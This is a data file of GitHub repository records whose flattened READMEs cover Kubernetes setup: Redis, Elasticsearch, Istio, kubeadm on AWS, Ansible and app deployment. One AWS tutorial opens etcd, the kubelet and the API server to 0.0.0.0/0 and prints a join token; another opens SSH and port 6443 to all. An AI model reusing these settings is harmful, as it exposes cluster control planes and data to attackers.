iSofiane,mongodb-on-k8s,,mongodb on k8s,2020-09-01T14:14:38Z,2020-10-15T10:06:13Z,Shell,User,1,1,0,0,master,,0,0,0,0,0,0,0
high-productivity,elastichsearch-k8s-ambassador,,Check my personal website at https tonydeveloper com Check my work at https highproductivity vn This repo is used to guide developers to setup ElasticSearch cluster in Amazon EKS The setup will setup 8 nodes of ElasticSearch Cluster secured the service through cloudfare and setup backup mechanism linking to Amazon S3 Read my tutorial how to setup a production Amazon EKS https tonydeveloper com 2020 09 13 setup production kubernetes cluster using amazon eks,2020-09-14T06:16:52Z,2020-10-12T10:35:42Z,Python,Organization,0,1,0,3,master,visser300,1,0,0,0,0,0,0
healinyoon,study_devops_k8s,,study devops k8s https www inflearn com course EB 8D B0 EB B8 8C EC 98 B5 EC 8A A4 EC BF A0 EB B2 84 EB 84 A4 ED 8B B0 EC 8A A4 EB A7 88 EC 8A A4 ED 84 B0 dashboard,2020-09-01T07:41:11Z,2020-11-25T09:21:15Z,n/a,User,1,1,0,25,master,healinyoon,1,0,0,0,0,0,0
tiberna,k8s-voting-example,,Kubernetes Voting Example Using Voting App https github com dockersamples example voting app to create a step by step tutorial to use Kubernetes for a full solution deploy Getting started Have access to a Kubernetes cluster AKS EKS GKE Docker Desktop with Kubernetes enabled minikube and kubectl https kubernetes io docs tasks tools install kubectl configured Architecture Architecture diagram files architecture png A front end web app in Python which lets you vote between two options A Redis https hub docker com redis queue which collects new votes A NET Core worker which consumes votes and stores them in database A Postgres https hub docker com postgres database backed by a Docker volume A Node js webapp which shows the results of the voting in real time Instructions First you must create a new namespace to handle all the resources that will be created during this lab kubectl create namespace vote Then you may follow two tutorials Hard way Follow this overview instructions tutorials hard way tutorial md for each step and you need to create the files by your own Step by step instructions Step 1 tutorials step1 instructions md Postgres database backed by a Docker volume Step 2 tutorials step2 instructions md Redis which will collect new votes for the application Step 3 tutorials step3 instructions md Result microservice which will present the results of the vote to end users Step 4 tutorials step4 instructions md Vote microservice which will allow end users to vote for their favorite pet Step 5 tutorials step5 instructions md Worker microservice which will receive and then store votes in the database You should have a total of 5 Deployments and 4 Services at minimum Create these objects using the Kubernetes CLI At this point you should be able to access the Voting App via port 31000 and 31001 Try to make vote only one per client use private windows and other browsers and check if everything is working properly However if it isn t working properly you need to debug Check the status of all Services and Deployments Read the logs from all of your Pods Double check configuration specified in all steps of the lab Using this command you may check logs from your pods kubectl logs Don t forget to check your resources on namespace vote using this flag on all commands n vote Or changing your default namespace for vote namespace kubectl config set context current namespace vote Step 6 tutorials step6 instructions md Fix your Voting App After making the test you figured out that your application have some issues Let s make some changes on the files to fix it and then do some improvements on our Voting App Resources Original repo for Voting App https github com dockersamples example voting app Kubernetes basics https www youtube com playlist list PLLasX02E8BPCrIhFrcZiINhbRkYMKdPT,2020-11-03T23:13:00Z,2020-12-03T21:04:26Z,n/a,Organization,1,1,1,26,main,tasb,1,0,0,0,0,0,0
aslam-mulkin,k8s-simple-vagrant,,k8s simple vagrant Simple kubernetes cluster on vagrant master 192 168 200 10 node 1 192 168 200 11 node 2 192 168 200 12 To Deploy Kubernetes Dashboard bash vagrant ssh master bash vagrant deploydashboard sh,2020-11-07T01:48:04Z,2020-11-11T09:20:42Z,Shell,User,1,1,0,14,master,aslam-mulkin,1,0,0,0,0,0,0
renatomatos79,redis-cluster-k8s,,Clone this repository in your local machine cd c temp git clone https github com renatomatos79 redis cluster k8s git cd redis cluster k8s And then run the commands below in order to create the redis PODs and expose them using a service name redis cluster 1 kubectl apply f redis sts yaml 2 kubectl apply f redis svc yaml Run this command to get all IPs and Ports kubectl get pods l app redis cluster o jsonpath range items status podIP 6379 You will see something like this 172 17 0 7 6379 172 17 0 8 6379 172 17 0 9 6379 172 17 0 10 6379 172 17 0 11 6379 172 17 0 12 6379 6379 Now remove the first and last char 172 17 0 7 6379 172 17 0 8 6379 172 17 0 9 6379 172 17 0 10 6379 172 17 0 11 6379 172 17 0 12 6379 6379 And then replace the char using a blank space 172 17 0 7 6379 172 17 0 8 6379 172 17 0 9 6379 172 17 0 10 6379 172 17 0 11 6379 172 17 0 12 6379 3 Finally we are able to run this final command After that in the command prompt answer YES to create the cluster kubectl exec it redis cluster 0 redis cli cluster create 172 17 0 7 6379 172 17 0 8 6379 172 17 0 9 6379 172 17 0 10 6379 172 17 0 11 6379 172 17 0 12 6379 cluster replicas 1 Let s verify the Cluster Deployment kubectl exec it redis cluster 0 redis cli cluster info Verify Cluster Roles kubectl exec redis cluster 0 redis cli role kubectl exec redis cluster 1 redis cli role kubectl exec redis cluster 2 redis cli role kubectl exec redis cluster 3 redis cli role kubectl exec redis cluster 4 redis cli role kubectl exec redis cluster 5 redis cli role Testing the Redis Cluster kubectl apply f app deployment service yaml Enable the external access for your app minikube service hit counter lb Opening service default hit counter lb in default browser For now you can verify the counter each time you refresh the page I have been hit 1 times since deployment Simulate a Node Failure kubectl delete pod redis cluster 0 kubectl delete pod redis cluster 1 Reference https rancher com blog 2019 deploying redis cluster The end,2020-12-15T01:47:17Z,2020-12-24T08:13:56Z,n/a,User,1,1,0,5,master,renatomatos79,1,0,0,0,0,0,0
bilelkhalsi,istio-action,,Istio Action https github com bilelkhalsi istio action workflows TestIstioInstall badge svg branch master https github com bilelkhalsi istio action actions A GitHub Action to install Istio https istio io on Kubernetes cluster Usage Pre requisites Create a workflow YAML file in your github workflows directory An example workflow example workflow is available below For more information reference the GitHub Help Documentation for Creating a workflow file https help github com en articles configuring a workflow creating a workflow file Use another Github Action as helm kind action to create a Kubernetes cluster Inputs version The Istio version to use default 1 7 4 profile The Istio profile demo default or minimal wait The duration to wait for the Istio CRD s to become ready default 60s Example Workflow Create a workflow eg github workflows install istio yml yaml name Install Istio on KinD K8s cluster on pullrequest jobs install cluster runs on ubuntu latest steps name Create k8s Kind Cluster uses helm kind action v1 0 0 name Install Istio uses bilelkhalsi istio action v0 1 0 This uses bilelkhalsi istio action https www github com bilelkhalsi istio action GitHub Action to spin up a kind https kind sigs k8s io Kubernetes cluster with Istion https istio io installed on every Pull Request Reference Documentation For further reference please consider the following sections KinD Github Action https github com helm kind action Istio Documentation https istio io latest docs,2020-11-01T14:02:32Z,2020-12-07T11:03:00Z,Shell,User,1,1,0,8,master,bilelkhalsi#iozone,2,1,1,0,0,0,2
amacdexp,JupyterHubKyma,,JupyterHubKyma JupyterHub running on SAP Cloud Platform Kyma Runtime Kubernetes with XSUAA OAUTH2 authentication Exanmple of runing a shared JupyteHub environment that enables XSUAA autenticated users to access Also included is the hana ml python library to simplify connection to SAP Hana with pandas dataframes as well as providing the ability to push down ML logic to HANA reducing data being copied Pre Reqs Provision a Kyma environment on SAP Cloud Platform Create a namespace e g mlteam Download your Kyma K8S access kubeconfig yml and set KUBECONFIG environment variable to point to kubeconfig yml Windows cmd Set KUBECONFIG C UsersDownloadskubeconfig yml Windows Powershell env KUBECONFIG C UsersDownloadskubeconfig yml Linux export KUBECONFIG kubeconfig yml Check the cluster in your new namespace kubectl cluster info n mlteam STEP 1 Create Persitant volume claim To be used for storage of Jupyter Notebooks and associated files kubectl replace force n mlteam f deploymentpvc yaml STEP 2 Create XSUAA service NOTE Ensure xsapp does not already exist deleted previous or rename if required Deploy xsuaa service which creates role in SCP CF kubectl replace force n mlteam f deploymentxsuaa yaml Manually generate the XSUAA credentials in Kyma UI Select namespace created e g mlteam Navigate to Service Management Instances xsuaa jupyterhub mlteam Select Credentials Tab Click Create Credentials Button Click on the generated credentials Click Decode button STEP 3 Deploy JupypterHub and Service access point Manually update deploymentjupyterhub yaml with clientid secret from Step 2 urls to domain specific XSUAA service cluster info Deploy Jupyterhub kubectl replace force n mlteam f deploymentjupyterhub yaml NOTE Deployment may take 10 minutes as includes a jupyter build step If you have docker repository you can prepare an docker file images containing the more time consuming steps You would then refer to this image in the deployment yaml NOTE2 Occassionally you may see in the Pod logs that the the Jupyter build failed due to low memory Re running usually resolves but if problem persists increase memory of pod and or create an image with the JupyterHub pre built STEP 4 optional Add a shared folder in Jupyter terminal window ln s home mlteam HOME mlteam Commonly used Kubcetl commands while deploying and checking kubectl n mlteam get services kubectl get APIRule n mlteam jupyterhub o yaml kubectl get secret n mlteam o yaml kubectl get ServiceInstance n mlteam kubectl get pods n mlteam kubectl exec stdin n mlteam tty jupyterhub bin bash,2020-11-03T03:49:12Z,2020-12-03T07:41:27Z,n/a,User,2,1,0,28,main,amacdexp,1,0,0,0,0,0,0
dubareddy,argocd-deployment,,argocd deployment Manifest files to deploy applications on k8s using ArgoCD,2020-11-25T06:00:34Z,2020-11-25T12:37:37Z,n/a,User,1,1,1,4,main,dubareddy,1,0,0,0,0,0,0
yasapurnama,Install-Kubernetes-with-AWS-Cloud-Provider,,Install Kubernetes with AWS Cloud Provider Install Kubernetes k8s on AWS Ubuntu 20 04 LTS Server Setting VPC Create new vpc with 10 0 0 0 16 CIDR Name Value Name tag K8s cluster vpc IPv4 CIDR block 10 0 0 0 16 IPv6 CIDR blocK No IPv6 CIDR block TenancyInfo Default Righ click select Manage tags and add this tag on the previously created vpc Key Value Name K8s cluster vpc kubernetes io cluster kubernetes owned Select Edit DNS hostnames then enable DNS hostnames Name Value DNS hostnames Subnet Create a subnet for the vpc Name Value Name tag K8s cluster net VPC Select K8s cluster vpc Availability Zone Select the desired zone E g ap southeast 1a VPC CIDRs Auto generated IPv4 CIDR block 10 0 0 0 24 Select Modify auto assign IP settings then Enable Public IPs for EC2 instances Name Value Auto assign IPv4 Enable auto assign customer owned IPv4 address Select Add Edit Tags then add this tag Key Value Name K8s cluster net kubernetes io cluster kubernetes owned Internet Gateway Create an Internet Gateway to route traffic from the subnet into the Internet Name Value Name tag K8s cluster igw Select Manage Tags then add this tag Key Value Name k8s cluster igw kubernetes io cluster kubernetes owned Select Attach to VPC then attach to previously created vpc Name Value VPC Select K8s cluster vpc Route Table Create a routing tablle Name Value Name tag K8s cluster rtb VPC Select K8s cluster vpc Select Add Edit Tags then add this tag Key Value Name K8s cluster rtb kubernetes io cluster kubernetes owned Select Edit routes add a new route to the 0 0 0 0 0 network via the Internet Gateway we ve created Destination Target Status Propagated 10 0 0 0 16 local active No 0 0 0 0 0 Select k8s cluster igw No Select Edit subnet associations then choose previously created subnet Subnet ID IPv4 CIDR IPv6 CIDR Current Route Table k8s cluster net 10 0 0 0 24 Main IAM Role Create IAM EC2 roles for node master and worker to make Kubernetes work on AWS IAM Master role Create new Policy by Go to the IAM Policies Create policy then add this in to the JSON Policy Name k8s cluster iam master policy json Version 2012 10 17 Statement Effect Allow Action autoscaling DescribeAutoScalingGroups autoscaling DescribeLaunchConfigurations autoscaling DescribeTags ec2 DescribeInstances ec2 DescribeRegions ec2 DescribeRouteTables ec2 DescribeSecurityGroups ec2 DescribeSubnets ec2 DescribeVolumes ec2 CreateSecurityGroup ec2 CreateTags ec2 CreateVolume ec2 ModifyInstanceAttribute ec2 ModifyVolume ec2 AttachVolume ec2 AuthorizeSecurityGroupIngress ec2 CreateRoute ec2 DeleteRoute ec2 DeleteSecurityGroup ec2 DeleteVolume ec2 DetachVolume ec2 RevokeSecurityGroupIngress ec2 DescribeVpcs elasticloadbalancing AddTags elasticloadbalancing AttachLoadBalancerToSubnets elasticloadbalancing ApplySecurityGroupsToLoadBalancer elasticloadbalancing CreateLoadBalancer elasticloadbalancing CreateLoadBalancerPolicy elasticloadbalancing CreateLoadBalancerListeners elasticloadbalancing ConfigureHealthCheck elasticloadbalancing DeleteLoadBalancer elasticloadbalancing DeleteLoadBalancerListeners elasticloadbalancing DescribeLoadBalancers elasticloadbalancing DescribeLoadBalancerAttributes elasticloadbalancing DetachLoadBalancerFromSubnets elasticloadbalancing DeregisterInstancesFromLoadBalancer elasticloadbalancing ModifyLoadBalancerAttributes elasticloadbalancing RegisterInstancesWithLoadBalancer elasticloadbalancing SetLoadBalancerPoliciesForBackendServer elasticloadbalancing AddTags elasticloadbalancing CreateListener elasticloadbalancing CreateTargetGroup elasticloadbalancing DeleteListener elasticloadbalancing DeleteTargetGroup elasticloadbalancing DescribeListeners elasticloadbalancing DescribeLoadBalancerPolicies elasticloadbalancing DescribeTargetGroups elasticloadbalancing DescribeTargetHealth elasticloadbalancing ModifyListener elasticloadbalancing ModifyTargetGroup elasticloadbalancing RegisterTargets elasticloadbalancing SetLoadBalancerPoliciesOfListener iam CreateServiceLinkedRole kms DescribeKey Resource Then go to Roles create new role with EC2 type Search previously created policy k8s cluster iam master policy Role Name k8s cluster iam master role IAM Worker role In the same way Create new Policy then add this in to the JSON Policy Name k8s cluster iam worker policy json Version 2012 10 17 Statement Effect Allow Action ec2 DescribeInstances ec2 DescribeRegions ecr GetAuthorizationToken ecr BatchCheckLayerAvailability ecr GetDownloadUrlForLayer ecr GetRepositoryPolicy ecr DescribeRepositories ecr ListImages ecr BatchGetImage Resource Then go to Roles create new role with EC2 type Search created policy k8s cluster iam worker policy Role Name k8s cluster iam worker role Running EC2 Master Node Create an EC2 Ubuntu Server 20 04 LTS using t2 medium type Recommended Kubernets master need at least 2 CPU cores if you use Free Tear t2 micro you ll facing error NumCPU on kubeadm init It can be ignores but Not Recommended Choosing AMI Select Ubuntu Server 20 04 LTS Choose Instance Type Select t2 medium Configure Instance Details Name Value Network select previously created VPC Select K8s cluster vpc IAM role select previously created master role Select k8s cluster iam master role Add Tags Key Value Name Master kubernetes io cluster kubernetes owned Configure Security Group Type Protocol Port range Source Description optional HTTP TCP 80 0 0 0 0 0 Protocol HTTP HTTPS TCP 443 0 0 0 0 0 Protocol HTTPS Custom TCP TCP 6443 0 0 0 0 0 Kubernetes API Server Custom TCP TCP 2379 2380 0 0 0 0 0 etcd server client API Custom TCP TCP 10250 0 0 0 0 0 Kubelet API Custom TCP TCP 10251 0 0 0 0 0 kube scheduler Custom TCP TCP 10252 0 0 0 0 0 kube controller manager Custom TCP TCP 10255 0 0 0 0 0 Read Only Kubelet API Custom TCP TCP 10259 0 0 0 0 0 Schedular Custom TCP TCP 10257 0 0 0 0 0 Controller All Traffic All All 10 0 0 0 16 VPC subnet Review all changes then Launch Worker Node While waiting master node create new EC2 instane in the same way like the master node but using k8s cluster iam worker rolee Choosing AMI Select Ubuntu Server 20 04 LTS Choose Instance Type Select t2 medium Configure Instance Details Name Value Network select previously created VPC Select K8s cluster vpc IAM role select previously created master role Select k8s cluster iam worker role Add Tags Key Value Name Worker kubernetes io cluster kubernetes owned Configure Security Group Type Protocol Port range Source Description optional SSH TCP 22 0 0 0 0 0 SSH HTTP TCP 80 0 0 0 0 0 Protocol HTTP HTTPS TCP 443 0 0 0 0 0 Protocol HTTPS Custom TCP TCP 10250 0 0 0 0 0 Kubelet API Custom TCP TCP 10255 0 0 0 0 0 Read Only Kubelet API Custom TCP TCP 30000 32767 0 0 0 0 0 NodePort Services All Traffic All All 10 0 0 0 16 VPC subnet Review all changes then Launch Config Kubernetes Cluster Master Node Setup bash sudo su upgrade install depedencies apt update apt upgrade y apt dist upgrade y apt install y apt transport https ca certificates curl software properties common gnupg2 net tools set FQDN hostname hostnamectl set hostname curl s http 169 254 169 254 latest meta data local hostname install docker apt install y docker io cat etc docker daemon json exec opts native cgroupdriver systemd log driver json file log opts max size 100m storage driver overlay2 EOF systemctl stop docker systemctl start docker systemctl enable docker cat etc sysctl d k8s conf net bridge bridge nf call ip6tables 1 net bridge bridge nf call iptables 1 net ipv4 ipforward 1 EOF sysctl system install kubelet kubeadm kubectl curl s https packages cloud google com apt doc apt key gpg sudo apt key add apt add repository deb http apt kubernetes io kubernetes xenial main apt update apt install y kubelet kubeadm kubectl cat etc kubernetes aws yaml apiVersion kubeadm k8s io v1beta2 kind ClusterConfiguration networking serviceSubnet 10 100 0 0 16 podSubnet 10 244 0 0 16 apiServer extraArgs cloud provider aws controllerManager extraArgs cloud provider aws EOF init cluster kubeadm init config etc kubernetes aws yaml NB if use Free tier t2 micro you ll facing minimum CPU issue add argument ignore preflight errors NumCPU to ignore masternode need at least 2 core CPU bash kubeadm init config etc kubernetes aws yaml ignore preflight errors NumCPU After cluster init you ll get unique token for worker node join kubeadm join 10 0 0 119 6443 token i4pna1 8tlp6kcmukr5sian discovery token ca cert hash sha256 c2974f5f46e06df9bddd532ac61617ada82943b09ee914847fd8f15f7b8ff008 save it we ll use later in worker node bash save kube config mkdir p HOME kube sudo cp i etc kubernetes admin conf HOME kube config sudo chown id u id g HOME kube config install Flannel CNI kubectl apply f https raw githubusercontent com coreos flannel master Documentation kube flannel yml kubectl get nodes Worker Node Setup bash sudo su upgrade install depedencies apt update apt upgrade y apt dist upgrade y apt install y apt transport https ca certificates curl software properties common gnupg2 net tools set FQDN hostname hostnamectl set hostname curl s http 169 254 169 254 latest meta data local hostname install docker apt install y docker io cat etc docker daemon json exec opts native cgroupdriver systemd log driver json file log opts max size 100m storage driver overlay2 EOF systemctl stop docker systemctl start docker systemctl enable docker cat etc sysctl d k8s conf net bridge bridge nf call ip6tables 1 net bridge bridge nf call iptables 1 net ipv4 ipforward 1 EOF sysctl system install kubelet kubeadm kubectl curl s https packages cloud google com apt doc apt key gpg sudo apt key add apt add repository deb http apt kubernetes io kubernetes xenial main apt update apt install y kubelet kubeadm kubectl Replace etc kubernetes node yml config below with your own Token i4pna1 8tlp6kcmukr5sian apiServerEndpoint 10 0 0 119 6443 caCertHashes sha256 c2974f5f46e06df9bddd532ac61617ada82943b09ee914847fd8f15f7b8ff008 name ip 10 0 0 186 eu west 3 compute internal bash cat etc kubernetes node yml apiVersion kubeadm k8s io v1beta1 kind JoinConfiguration discovery bootstrapToken token i4pna1 8tlp6kcmukr5sian apiServerEndpoint 10 0 0 119 6443 caCertHashes sha256 c2974f5f46e06df9bddd532ac61617ada82943b09ee914847fd8f15f7b8ff008 nodeRegistration name ip 10 0 0 186 eu west 3 compute internal kubeletExtraArgs cloud provider aws EOF bash join cluster kubeadm join config etc kubernetes node yml Check Nodes Go back to master to check the nodes bash check nodes kubectl get nodes References https rtfm co ua en kubernetes part 2 a cluster set up on aws with aws cloud provider and aws loadbalancer https rtfm co ua en kubernetes part 2 a cluster set up on aws with aws cloud provider and aws loadbalancer https www linuxtechi com install kubernetes k8s on ubuntu 20 04 https www linuxtechi com install kubernetes k8s on ubuntu 20 04 https github com Kubelancer Kubernetes with AWS Cloud Provider Kubeapps Wordpress https github com Kubelancer Kubernetes with AWS Cloud Provider Kubeapps Wordpress,2020-11-09T00:36:05Z,2020-11-15T09:58:08Z,n/a,User,1,1,0,7,main,yasapurnama,1,0,0,0,0,0,0
Consensas,consensas-ansible,,consensas ansible Introduction A couple of Ansible https www ansible com scripts that you might find useful especially for creating and working with Kubernetes AWS Quickstart how to set up your Ansible inventory with AWS Kubernetes Quickstart quickly set up a Kubernetes installation with Flannel Ubuntu Initialize Ubuntu 20 04 basic setup Ubuntu Full add more packages to your Ubuntu installation Node Install install the latest Node JS You ll need to have Ansible installed on your computer and root access to edit etc hosts https www thegeekdiary com understanding etc hosts file in linux It s nice to have Kubernetes on your computer so you can communicate with the K8S cluster One word of advice make these your own copy and modify as you see fit for your system Don t expect super parameterized general scripts here It s a jumping off point Inventory Ansible uses an inventory file to describe all the hosts upon which it s going to operate on In these examples we just have the inventory in this folder rather than use the system wide inventory Here s an example inventory for AWS with a Kubernetes Master and two Workers named aws 0001 and then aws 0002 and onwards all hosts aws 0000 9999 ansibleuser ubuntu ansiblesshprivatekeyfile Users david aws production pem children master hosts aws 0001 worker hosts aws 0002 aws 0003 You should edit etc hosts to add the IP addresses for aws 52 201 0 193 aws 0001 34 227 235 37 aws 0002 34 227 235 38 aws 0003 If you have SSH login without password https phoenixnap com kb setup passwordless ssh setup you can do the following In this particular case make sure that user david can sudo root commands all hosts server 0000 9999 ansibleuser david children master hosts aws 0001 worker hosts aws 0002 aws 0003 Important if you customize and use your own naming scheme you ll have to modify k8s Kubernetes Master sh is Kubernetes requires that you tell it the DNS name you ll using to talk to it AWS Quickstart If you already have some computers available skip ahead to the inventory sections Note that these scripts are designed around the x86 architecure so you might have to make some tweaks e g for Raspberry Pi Log in to your AWS Account and go to EC2 https console aws amazon com ec2 v2 home region us east 1 Home Go to the Launch Wizard https console aws amazon com ec2 v2 home region us east 1 LaunchInstanceWizard Look for the AMI called Ubuntu Server 20 04 LTS HVM SSD Volume Type and go through the setup step by step Instance Type to taste t2 medium is the minimum it will require at least 2 cores Configure Instance Details select the number of instances to create you need at least 2 for K8S Everything else should be fine Add Storage should be fine Add Tags to taste Configure Security Group make sure there is open 0 0 0 0 32 SSH port 22 and Kubernetes port 6443 access Not sure if VPC open is the default but this is required too From a security point of view this isn t ideal and you ll want to narrow it down but explaining AWS Security Groups is out of scope Review Instance Launch review and press Launch Create a keypair if you haven t already and store in aws Make sure that folder is chmod 700 The keypair is stored in a PEM file which is needed for accessing AWS Go back to the EC2 home page and name the servers aws 0001 and so on Notes on AWS networking If you re just playing around and plan to be starting and stopping the instances frequently so you don t get charged consider assigning ElasticIP addresses to your instances otherwise the IP will change every time you start and stop Another option is to use IPv6 though I have not played with this If the IP addresses change you will have to edit HOME ssh knownhosts and delete the old IP addresses first If you re not familiar with AWS just be aware every host has two IP address one for its Virtual Private Cloud VPC inside AWS and the other is public for the world to see If you get long hangs and then failures likely the issue is something is being blocked because of your security rules AWS Inventory Copy the names and Public IPv4 or ElasticIP addresses and add to etc hosts on your computer Make sure inventory yaml also reflects the hosts you created AND your PEM file It should look something like this assuming you created 3 hosts inventory yaml all hosts aws 0000 9999 ansibleuser ubuntu ansiblesshprivatekeyfile Users david aws davidjanes pem children master hosts aws 0001 worker hosts aws 0002 aws 0003 Kuberenetes Quickstart This repository very quickly will set up a Kubernetes https kubernetes io system on AWS trivially adapted to other clouds or machines on the LAN with Flannel https github com coreos flannel networking K8S is to me a very very complicated system but one nice thing about it is if you run into trouble you can usually just tear it down and rebuild I originally wrote this when we were having difficulty getting networking working this let me try out a whole bunch of different options in a matter of minutes Setup Ubuntu Follow the instructions in the Ubuntu Initialize section below Setup Kubernetes First run this script This will install Kubernetes Container io system level configuration e g turning off swap needed to run K8S on all the hosts For reference though we used very little of this read more https kubernetes io blog 2019 03 15 kubernetes setup using ansible and vagrant sh k8s Kubernetes Common sh Next and order is very important here run this script to set up the K8S master sh k8s Kubernetes Master sh Then to configure all the workers sh k8s Kubernetes Worker sh At this point you cluster should be up and running To confim sh k8s Kubernetes KubeConfig sh And you should see kubectl kubeconfig admin conf get nodes NAME STATUS ROLES AGE VERSION aws 0001 Ready master 2m10s v1 19 4 aws 0002 Ready 23s v1 19 4 Ubuntu Initialize Run this script which will install Python needed for ansible and make sure the software is up to date sh ubuntu Ubuntu Initialize sh It can be parameterized with a single argument the name of a host or a collection of hosts e g master workers in case you add something later Note that this script like all others here are basically idempotent you can safely run it multiple times Ubuntu Full Run this script which will install vim and net tools A number of other packages you might find useful are commented out Normally you will run this parameterized as usually on Kubernetes Workers there s no need to install everything Even better is to modify your inventory and add new groups like mail or wordpress and use that so package installation is more logical sh ubuntu Ubuntu Full sh aws 0001 Note that this script like all others here are basically idempotent you can safely run it multiple times,2020-11-13T14:32:27Z,2020-12-07T01:41:15Z,Shell,Organization,2,1,1,1,main,dpjanes,1,0,0,0,0,0,0
8tomat8,k8s-in-a-nutshell,,k8s in a nutshell WORK IN PROGRESS Code for the presentation workshop about docker k8s helm Link to the slides https docs google com presentation d 1VGbKjSpmMgWQzFKXw87fTOC0yQ6MD5UXVNpGehvmEGA edit usp sharing,2020-09-22T17:24:04Z,2020-09-25T10:46:40Z,n/a,User,1,1,0,2,master,8tomat8,1,0,0,0,0,0,0
jimdickinson,stardog,,stardog Keep track of your sprawling amount of pods across hundreds of Kubernetes clusters and thousands of namespaces Using Astra free tier with STARGATE document storage No giant monthly bills or per pod charges included Instructions Run fetcher Run setter Run web app Find pods in CrashLoopBackoff,2020-09-11T15:27:18Z,2020-09-14T19:09:49Z,Python,User,2,1,0,17,master,jimdickinson#EricBorczuk#johntrimble,3,0,0,1,0,1,12
dmytriibrovko,terraform_ansible,,example for recruiter An example of my App Writing a small test application to show my code and technologies with witch I work The app is still in development and will be updated Status of last Deployment It uses a terraform that generates an inventory file for ansible terraform apply var file terraform demo staging tfvars terraform demo ansible playbook i inventory ansible site yml Application packed in docker containers frontend its React redux Node js taken from the course https academy zerotomastery io p complete web developer zero to mastery backend with frontend connection in the src actions js file backend its my simple flask app with only get information from the Mongodb Mongo which itself is generated Now I m trying to set up a k8s and then pack it in Helm,2020-08-23T15:40:08Z,2020-11-29T19:10:24Z,JavaScript,User,1,1,0,15,master,dmytriibrovko,1,0,0,0,0,0,0
taoshanghu,log-spirit,,log spirit k8saliyuenlog pilotlog spiritdockerelasticsearchgraylog2awsoglog spiritdocker stdoutdocker docker compose 1 6 Docker Engine 1 10 log spirit git clone git github com taoshanghu log spirit git build log pilot image cd log pilot build image sh quick start cd quickstart run filebeat tomcat pod apiVersion v1 kind Pod metadata name tomcat spec tolerations key node role kubernetes io master effect NoSchedule containers name tomcat image tomcat 7 0 env stdout name logspiritlogscatalina value stdout name logspiritlogsaccess value usr local tomcat logs catalina log name logspiritlogsmultiline value true name logspiritlogspattern value d4 d2 d2Td2 d2 d2 volumeMounts name tomcat log mountPath usr local tomcat logs volumes name tomcat log emptyDir,2020-12-14T01:41:33Z,2020-12-14T02:19:04Z,Go,User,1,1,0,5,master,taoshanghu#Velik123,2,0,0,0,0,0,0
wesdu,django-istio-opentracing,,Django istio opentracing Django opentracing middleware works with k8s and istio install pip install django istio opentracing example Add a middleware to your Django middleware python MIDDLEWARE djangoistioopentracing middleware Middleware And if you using requests https requests readthedocs io en master jusing using the patch in maybe your init py file Hint make sure the patch line before your code python from djangoistioopentracing import monkey monkey patchrequests Then use requests https requests readthedocs io en master whatever you want every request you make will carry the b3 code in header without extra coding Also you can use it directly in view python from djangoistioopentracing import getopentracingspanheaders def index request print getopentracingspanheaders return HttpResponse ok,2020-10-28T06:40:22Z,2020-12-16T02:33:47Z,Python,User,1,1,0,0,master,,0,0,0,0,0,0,0
ktlcove,alibaba-log-alertor,,aliyun log alertor framework ref https github com ktlcove kube admission bash k8s kube system namespace kube system configmap log project values yaml hack AliyunLogAlertor ala AliyunLogAlertor doc sample ala yaml spec detail https aliyun log python sdk readthedocs io READMECN html id21 1 apidump webhook dump github ala aliyun log project 1 k8s crd helm chat https help aliyun com documentdetail 74878 html spm a2c4g 11186623 2 18 907c385aQWhHH8 concept tfg pl1 f2b helm chat https github com ktlcove kube admission values yaml helm3 k8s kubectl get ala aliyunlogconfig n service NAME AGE aliyunlogalertor sls ext aliyun com core default 17d NAME AGE aliyunlogconfig log alibabacloud com core file all 14d aliyunlogconfig log alibabacloud com core stdout all 14d,2020-10-12T11:08:14Z,2020-10-20T03:20:05Z,Python,User,1,1,0,0,master,,0,0,0,0,0,0,0
np-hg,SplashPage,,,2020-10-27T16:50:58Z,2020-11-23T16:09:34Z,Go,User,1,1,1,43,main,npapapietro#np-hg#bbriggs,3,3,4,0,0,0,16
elixir-berlin,startup-server-deployment,,Startup Server Deployment Configuration to deploy the extreamestartup https github com rchatley extremestartup server Docker Imgae used elixirberlin extremestartup latest Deploying 1 Configure kubectl 2 Cehckout this repo 3 run kubectl apply recursive f k8s Remove deployment kubetl delete namespace extreme startup Checking logs of the running server kubectl logs f deployment extreme server n extreme server,2020-11-12T13:25:17Z,2020-11-12T17:03:05Z,n/a,Organization,2,1,0,1,main,duksis,1,0,0,0,0,0,0
pasenidis,edpasenidis.tech,k8s#website,edpasenidis tech https edpasenidis tech Personal website,2020-12-16T16:03:24Z,2020-12-27T22:52:15Z,JavaScript,User,1,1,0,68,main,pasenidis,1,0,0,0,0,0,1
Alphathur,spring-boot-k8s-app,,Spring Boot K8s App Run spring boot application and mysql on kubernetes cluster Prerequisite Docker and kubernetes cluster Local registry setup guide https medium com htc research engineering blog setup local docker repository for local kubernetes cluster 354f0730ed3a kubectl Jdk 1 8 Maven 3 x Setup application download this project download or clone this project use your master node ip to replace 192 168 6 128 in deploy spring boot deployment yaml https github com Alphathur spring boot k8s app blob master deploy spring boot deployment yaml L30 start mysql database bash kubectl apply f deploy mysql pv yaml kubectl apply f deploy mysql deployment yaml start springboot application bash sh deploy auto deploy sh all pods are running bash root k8s master Desktop kubectl get pods o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES mysql 788465ddd blq6z 1 1 Running 0 108s 10 244 1 33 k8s node1 spring boot k8s app deployment bf6b8d8b4 xkcgb 1 1 Running 0 11m 10 244 2 25 k8s node2 test your application get node ip bash root k8s master Desktop kubectl get nodes o wide NAME STATUS ROLES AGE VERSION INTERNAL IP EXTERNAL IP OS IMAGE KERNEL VERSION CONTAINER RUNTIME k8s master Ready master 45h v1 19 0 192 168 6 128 CentOS Linux 7 Core 3 10 0 957 12 2 el7 x8664 docker 18 6 1 k8s node1 Ready 44h v1 19 0 192 168 6 131 CentOS Linux 7 Core 3 10 0 957 12 2 el7 x8664 docker 18 6 1 k8s node2 Ready 44h v1 19 0 192 168 6 132 CentOS Linux 7 Core 3 10 0 957 12 2 el7 x8664 docker 18 6 1 test your api by http NodeIp NodePort bash root k8s master Desktop curl http 192 168 6 132 32082 SpringBoot K8s Application bash root k8s master Desktop curl http 192 168 6 132 32082 students id 1 name Andrew age 22 gender 1 parent Sony birth 1998 06 23 id 2 name Tom age 21 gender 0 parent Jackie birth 1999 01 23 id 3 name Johnson age 20 gender 1 parent Mickey birth 1920 11 23 Uninstall application java kubectl delete f deploy mysql deployment yaml kubectl delete f deploy mysql pv yaml kubectl delete f deploy spring boot deployment yaml,2020-09-07T08:26:11Z,2020-09-09T02:58:24Z,Java,User,1,1,0,25,master,Alphathur,1,0,0,0,0,0,0
